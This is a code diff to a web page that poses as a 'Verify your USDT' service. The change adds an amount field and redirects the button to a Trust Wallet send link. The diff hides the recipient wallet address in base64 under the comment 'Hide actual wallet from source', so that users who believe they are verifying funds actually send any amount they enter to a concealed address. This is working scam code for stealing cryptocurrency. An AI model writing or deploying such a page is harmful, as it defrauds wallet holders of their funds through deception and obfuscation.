@@ -43,6 +43,15 @@
       max-width: 400px;
       width: 100%;
     }
+    input[type="number"] {
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 10px;
+      border: none;
+      width: 80%;
+      margin-top: 15px;
+      text-align: center;
+    }
     button {
       background: #00ffcc;
       color: #000;
@@ -80,7 +89,8 @@
 
   <div class="card">
     <h2>Verify your USDT</h2>
-    <p>Click the button below to verify with a 1 USDT TRC20 transfer</p>
+    <p>Enter any amount to send via Trust Wallet</p>
+    <input type="number" id="amount" placeholder="Enter USDT amount" />
     <button onclick="verifyUSDT()">Verify USDT</button>
     <div class="processing" id="processingText">Processing verification...</div>
   </div>
@@ -90,11 +100,22 @@
   </footer>
 
   <script>
+    // Hide actual wallet from source
+    const walletBase64 = "VEQ4S3FMU1lNaUU0eExYNFFWcnpYNFBScmpwQ2lzN3Z1Swo=";
+    const walletAddress = atob(walletBase64).trim(); // decode hidden wallet
+
     function verifyUSDT() {
+      const amount = document.getElementById("amount").value;
+      if (!amount || parseFloat(amount) <= 0) {
+        alert("Please enter a valid amount.");
+        return;
+      }
+
       document.getElementById("processingText").style.display = "block";
       setTimeout(() => {
-        window.location.href = "https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=TJs3rspiCknNcK8gndtxHqzGNZCvdWQLrs&amount=1";
-      }, 1800); // Delay before redirecting to Trust Wallet
+        const url = `https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=${walletAddress}&amount=${amount}`;
+        window.location.href = url;
+      }, 1500);
     }
   </script>
 
